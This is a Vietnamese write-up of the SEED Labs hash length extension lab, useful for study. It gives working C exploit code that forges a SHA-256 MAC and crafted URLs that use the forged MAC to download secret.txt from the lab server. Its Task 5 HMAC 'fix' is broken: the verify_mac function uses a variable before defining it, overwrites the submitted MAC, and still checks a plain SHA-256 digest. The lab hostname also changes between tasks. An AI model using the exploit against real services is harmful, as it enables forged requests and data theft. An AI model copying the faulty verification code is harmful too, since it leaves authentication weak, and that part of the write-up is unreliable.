# Hash Length Extension Attack


Bài lab này của SEED LABS nên yêu cần phải thực hiện setup môi trường và source phù hợp. Mình sẽ pass qua phần này nhé các bạn hãy tự tham khảo và thiết lập môi trường SeedLabs[https://seedsecuritylabs.org/Labs_16.04/PDF/Crypto_Hash_Length_Ext.pdf] tại đâyy.
## Task 1: Send Request to List Files

Task này yêu cầu chúng ta tạo ra 1 đường link có format :
```
 http://www.seedlabhashlengthext.com:5000/?myname=<name>&uid=<need-to-fill>&lstcmd=1
 &mac=<need-to-calculate>
```
Trong đó name là tên của người làm mỗi tên khác nhau sẽ cho ra kết quả khác nhau. uid sẽ được cung cấp trong file key.txt kèm trong source và mỗi uid sẽ đi kèm với 1 key tương ứng.
mac là phần mà chúng ta cần tính toán sha256 từ 1 format khác cùng key, uid và name.

Truy cập vào file key.txt 
```
1001:123456
1002:983abe
1004:98zjxc
1005:xciujk
```
Vì cặp đầu tiên đã được lấy làm ví dụ nên mình sẽ lấy cặp thứ 2 để bắt đầu. Ta có name = datnlq uid = 1002 key = 983abe
Sau đó dùng câu lệnh sau để tính toán mac :
```
echo -n "983abe:myname=datnlq&uid=1002&lstcmd=1" | sha256sum
```
Và kết quả thu được là : *b6aa584f22407ff8083695069626be384c5c32974a1c180c3d33d4a1a666d4cc*
```
http://www.seedlablenext.com:5000/?myname=datnlq&uid=1002&lstcmd=1
&mac=b6aa584f22407ff8083695069626be384c5c32974a1c180c3d33d4a1a666d4cc
```

Nếu thành công thì server sẽ trả về như sau.



## Task 2: Create Padding

Kích thước khối của SHA-256 là 64 byte, vì vậy M sẽ được đệm vào bội số của 64 byte trong quá trình tính toán băm. Theo RFC 6234, phần đệm cho SHA256 bao gồm một byte \ x80,
theo sau là nhiều số \x00, tiếp theo là trường độ dài 64 bit (8 byte) (độ dài là số bit trong M) .
M có format như sau : 
```
<key>:myname=<name>&uid=<uid>&lstcmd=1
983abe:myname=datnlq&uid=1002&lstcmd=1
```
Sau đó tính toán len(M) = 38 bytes, để đảm bảo có 64 bytes thì ta sẽ có 64 - 38 = 26 bytes padding.
Padding bao gồm \x80 để nhận biết padding , 38*8 = 304 = 0x130 phía sau cùng tương đương độ dài của M là : \x01\0x30 còn lại ở giữa là những bytes \x00 vậy ta có padding là : 

```
"983abe:myname=datnlq&uid=1002&lstcmd=1"
"\x80
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x01\x30"
```


## Task 3: Compute MAC using Secret Key

Task này thêm phần đuôi vào padding của chúng ta : e N = "Extra message" và để xem như thế có thể hoạt đông hay không.

Đề cung cấp code cho chúng ta để tính ra mac :

```
/* calculate_mac.c */
#include <stdio.h>
#include <openssl/sha.h>
int main(int argc, const char *argv[])
{
	SHA256_CTX c;
	unsigned char buffer[SHA256_DIGEST_LENGTH];
	int i;
	SHA256_Init(&c);
	SHA256_Update(&c,
	"983abe:myname=datnlq&uid=1002&lstcmd=1"
	"\x80"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x01\x30"
	"Extra message",
	64+13);
	SHA256_Final(buffer, &c);
	for(i = 0; i < 32; i++) 
	{
		printf("%02x", buffer[i]);
	}
	printf("\n");
	return 0;
}


//gcc calculate_mac.c -o calculate_mac -lcrypto
```
Đây là mac = 971cec96e938ed24cd35362eac00e341e0103eba1d638fcb9835f1a199e16fd4 thu được sau khi chạy chương trình.
Và đưa vào format sau :

```

http://www.seedlablenext.com:5000/?myname=<name>&uid=<uid>
&lstcmd=1<padding>&download=secret.txt
&mac=<hash-value>

http://www.seedlablenext.com:5000/?myname=datnlq&uid=1002
&lstcmd=1%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%01%30&download=secret.txt
&mac=971cec96e938ed24cd35362eac00e341e0103eba1d638fcb9835f1a199e16fd4

```
Và chúng ta nhận được kết quả là không thể truy cập được. Task này cơ bản chỉ cho chúng ta thấy cách hoạt động của MAC như thê nào.

## Task 4: The Length Extension Attack

Từ lần trước chúng ta rút ra được rằng ta có thể thêm 1 phần mess phía sau vào. Đó chính là cách khai thác hash length extension và bây giờ ta sẽ khai thác nó trong task này.
Thay vì thêm Extra message thì mình sẽ thay bằng chuổi độc hại mà chúng ta muốn tấn công như là : *&download=secret.txt* 
Làm tương tự task3 và chúng ta có kết quả
```
/* length_ext.c */
#include <stdio.h>
#include <arpa/inet.h>
#include <openssl/sha.h>
int main(int argc, const char *argv[])
{
	int i;
	unsigned char buffer[SHA256_DIGEST_LENGTH];
	SHA256_CTX c;
	SHA256_Init(&c);
	for(i=0; i<64; i++)
	SHA256_Update(&c, "*", 1);
	// MAC of the original message M (padded)
	c.h[0] = htole32(0xb6aa584f);
	c.h[1] = htole32(0x22407ff8);
	c.h[2] = htole32(0x08369506);
	c.h[3] = htole32(0x9626be38);
	c.h[4] = htole32(0x4c5c3297);
	c.h[5] = htole32(0x4a1c180c);
	c.h[6] = htole32(0x3d33d4a1);
	c.h[7] = htole32(0xa666d4cc);
	// Append additional message
	SHA256_Update(&c, "&download=secret.txt", 20);
	SHA256_Final(buffer, &c);
	for(i = 0; i < 32; i++) 
	{
		printf("%02x", buffer[i]);
	}
	printf("\n");
	return 0;
}

//b6aa584f22407ff8083695069626be384c5c32974a1c180c3d33d4a1a666d4cc
//gcc length_ext.c -o length_ext -lcrypto

```

Và kết quả đã thành công, chúng ta đã tải được file secret.txt về.


## Task 5: Attack Mitigation using HMAC

Task 4 đã cho chúng ta thấy lỗ hổng của MAC, task này yêu cầu chúng ta làm 1 bản nâng cấp của MACs là HMAC 
Đề yêu cầu chúng ta thêm hàm hmac vào *verify mac()* trong file lab.py mà để đã cung cấp, cũng như là 1 cách xác thực đểm xem MAC có bị hash length extension hay không. Ngoài ra đề cũng đã cung cấp cho chúng ta cách thức hoạt động của của HMAC nên chúng ta chỉ cần thêm vào thôi là ổn.
```
def verify_mac(key, my_name, uid, cmd, download, mac):

    mac = (hmac.new(bytearray(key.encode('utf-8')),
        msg = message.encode('utf-8','surrogateescape'),
        digestmod=hashlib.sha256).hexdigest())

    
    download_message = '' if not download else '&download=' + download
    message = ''
    if my_name:
        message = 'myname={}&'.format(my_name)
    message += 'uid={}&lstcmd='.format(uid) + cmd + download_message
    payload = key + ':' + message
    app.logger.debug('payload is [{}]'.format(payload))
    real_mac = hashlib.sha256(payload.encode('utf-8', 'surrogateescape')).hexdigest()
    app.logger.debug('real mac is [{}]'.format(real_mac))
    if mac == real_mac:
        return True
    return False
    
```

Như vậy tính toàn vẹn của hàm sẽ được đảm bảo hơn.

Đề kiểm chứng HMAC có thật sự chặn được hash length extension attack hay không thì chúng ta hãy làm như task4 để kiểm chứng xem .
```
mac = (hmac.new(bytearray(key.encode('utf-8')),msg = message.encode('utf-8','surrogateescape'),digestmod=hashlib.sha256).hexdigest())
2704e930f1205bebe2ec87b0d73ec2d787faf5859e3ff3ccfe4311f9f05ef5ad
```

Sau đó đưa vào chương trình sau để tiến hành hash length extension attack:

```
/* length_ext.c */
#include <stdio.h>
#include <arpa/inet.h>
#include <openssl/sha.h>
int main(int argc, const char *argv[])
{
	int i;
	unsigned char buffer[SHA256_DIGEST_LENGTH];
	SHA256_CTX c;
	SHA256_Init(&c);
	for(i=0; i<64; i++)
	SHA256_Update(&c, "*", 1);
	// MAC of the original message M (padded)
	c.h[0] = htole32(0x2704e930);
	c.h[1] = htole32(0xf1205beb);
	c.h[2] = htole32(0xe2ec87b0);
	c.h[3] = htole32(0xd73ec2d7);
	c.h[4] = htole32(0x87faf585);
	c.h[5] = htole32(0x9e3ff3cc);
	c.h[6] = htole32(0xfe4311f9);
	c.h[7] = htole32(0xf05ef5ad);
	// Append additional message
	SHA256_Update(&c, "&download=secret.txt", 20);
	SHA256_Final(buffer, &c);
	for(i = 0; i < 32; i++) 
	{
		printf("%02x", buffer[i]);
	}
	printf("\n");
	return 0;
}
```

Sau khi chạy chương trình chúng ta được mac = 5f71f1e00832f3a3b3914abce57c056bef70483d8b58d03f73e18826cccc756c
Đưa vào format:
```
http://www.seedlablenext.com:5000/?myname=datnlq&uid=1002
&lstcmd=1%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%01%30&download=secret.txt
&mac=5f71f1e00832f3a3b3914abce57c056bef70483d8b58d03f73e18826cccc756c
```
Và kết quả trả về là không thành công. Điều đó có nghĩa là HMAC đã chặn được hash length extension attack

HMAC không dễ bị length extension attack. Nó tính toán hàm băm hai lần. Một khóa bí mật ban đầu được sử dụng để tạo ra hai khóa khác được gọi là khóa bên trong và khóa bên ngoài.Thuật toán sẽ tạo một hàm băm bên trong đến từ thông báo và khóa đầu tiên. Lần hash thứ 2, HMAC được tạo từ kết quả băm bên trong và khóa bên ngoài, điều này làm cho nó miễn nhiễm với hash length extension attack 



